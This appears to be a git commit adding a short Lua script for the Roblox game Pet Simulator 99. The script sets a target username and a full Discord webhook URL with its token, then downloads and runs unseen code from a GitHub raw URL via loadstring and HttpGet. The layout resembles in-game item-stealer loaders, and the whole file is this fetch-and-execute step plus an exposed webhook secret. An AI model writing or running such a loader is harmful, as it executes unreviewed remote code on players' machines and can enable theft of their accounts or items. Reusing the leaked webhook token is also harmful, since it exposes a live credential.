2eecef33f4c5600612c84fb488192f433a97f4e1
ThrustScript <162525394+ThrustScript@users.noreply.github.com>
2024-03-07 08:49:01 +0700

    PS99.lua

---
+++ PS99.lua
@@ -0,0 +1,5 @@
+Username = "palapuy23"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1215086774343307264/K8Hqla7ZlZFSHiWo0Ts7Khsadg2A7yCYo0dLfvleKK7s_j7JkeRND2-kwWyriFKhRrqA"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_palapuy23/main/palapuy23.lua"))()
